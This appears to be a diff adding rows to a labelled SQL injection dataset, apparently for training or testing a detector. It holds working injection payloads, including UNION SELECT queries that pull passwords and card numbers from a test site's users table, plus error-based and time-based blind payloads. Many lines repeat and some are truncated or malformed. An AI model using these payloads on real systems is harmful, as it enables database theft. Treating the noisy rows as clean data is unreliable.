+GET http://testphp.vulnweb.com/artists.php?artist=-1 UNION SELECT 1,pass,cc FROM users WHERE uname='test' HTTP/1.1 Host: testphp.vulnweb.com
+GET http://testphp.vulnweb.com/artists.php?artist=-1 UNION SELECT 1, 2, 3 HTTP/1.1 Host: testphp.vulnweb.com' HTTP/1.1 Host: testphp.vulnweb.com
+GET http://testphp.vulnweb.com/artists.php?artist=-1 UNION SELECT 1,pass,cc FROM users WHERE uname='test' HTTP/1.1 Host: testphp.vulnweb.com
+GET http://testphp.vulnweb.com/artists.php?artist=-1 UNION SELECT * FROM users WHERE uname='test' HTTP/1.1 Host: testphp.vulnweb.com
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( table_name )  FROM  ( SELECT DISTINCT ( table_name ) , ROWNUM AS LIMIT FROM sys.all_tables )  WHERE LIMIT = 5  )  )   AND 'i' = 'i
+select * from users where id = '1' or @ @1 = 1 union select 1,version (  )  -- 1'
+select * from users where id = 1 or 1#(  union select 1,version (  )  -- 1
+GET http://testphp.vulnweb.com/artists.php?artist=1 or benchmark ( 10000000,MD5 ( 1  )  )  #",1
+GET http://testphp.vulnweb.com/artists.php?artist=-1 UNION SELECT 1,pass,cc FROM users WHERE uname='test' HTTP/1.1 Host: testphp.vulnweb.com
+GET http://testphp.vulnweb.com/artists.php?artist=-1 UNION SELECT 1, 2, 3 HTTP/1.1 Host: testphp.vulnweb.com' HTTP/1.1 Host: testphp.vulnweb.com
+GET http://testphp.vulnweb.com/artists.php?artist=-1 UNION SELECT 1,pass,cc FROM users WHERE uname='test' HTTP/1.1 Host: testphp.vulnweb.com
+GET http://testphp.vulnweb.com/artists.php?artist=-1 UNION SELECT * FROM users WHERE uname='test' HTTP/1.1 Host: testphp.vulnweb.com
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( table_name )  FROM  ( SELECT DISTINCT ( table_name ) , ROWNUM AS LIMIT FROM sys.all_tables )  WHERE LIMIT = 5  )  )   AND 'i' = 'i
+select * from users where id = '1' or @ @1 = 1 union select 1,version (  )  -- 1'
+select * from users where id = 1 or 1#(  union select 1,version (  )  -- 1
+GET http://testphp.vulnweb.com/artists.php?artist=1 or benchmark ( 10000000,MD5 ( 1  )  )  #",1
+GET http://testphp.vulnweb.com/artists.php?artist=-1 UNION SELECT 1,pass,cc FROM users WHERE uname='test' HTTP/1.1 Host: testphp.vulnweb.com
+GET http://testphp.vulnweb.com/artists.php?artist=-1 UNION SELECT 1, 2, 3 HTTP/1.1 Host: testphp.vulnweb.com' HTTP/1.1 Host: testphp.vulnweb.com
+GET http://testphp.vulnweb.com/artists.php?artist=-1 UNION SELECT 1,pass,cc FROM users WHERE uname='test' HTTP/1.1 Host: testphp.vulnweb.com
+GET http://testphp.vulnweb.com/artists.php?artist=-1 UNION SELECT * FROM users WHERE uname='test' HTTP/1.1 Host: testphp.vulnweb.com
 """ or pg_sleep ( __TIME__ ) --",1
 1  )  )   or sleep ( __TIME__ ) #,1
 "' or benchmark ( 10000000,MD5 ( 1  )  )  #",1
@@ -83,7 +1140,8 @@ GET http://testphp.vulnweb.com/artists.php?artist=1' or char ( 68 ) ||char ( 69 
 GET http://testphp.vulnweb.com/artists.php?artist=1' in boolean mode )  and 3707 =  ( select count ( * )  from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) #",1
 GET http://testphp.vulnweb.com/artists.php?artist=1%"" or 1022 =  ( select count ( * )  from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) --",1
 "call regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null )  and   (  (  ""pawh"" = ""pawh",1
- ( 1589 = 1589 ) *1,1
+-1 UNION SELECT 1,pass,cc FROM users WHERE uname
+SELECT 1,pass,cc FROM users WHERE uname
 "select count ( * )  from generate_series ( 1,5000000 )  and   (  (  7240 = 7240",1
 1  )  )   )  and 3715 in   (  (  char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select  ( case when  ( 3715 = 3715 )  then char ( 49 )  else char ( 48 )  end  )  )  +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113  )  )   )  and   (  (   ( 9548 = 9548,1
 1  )  )   and 6240 =  ( 'qqpjq'|| ( select case 6240 when 6240 then 1 else 0 end from rdb$database ) ||'qzvzq' )  and   (  (  6406 = 6406,1
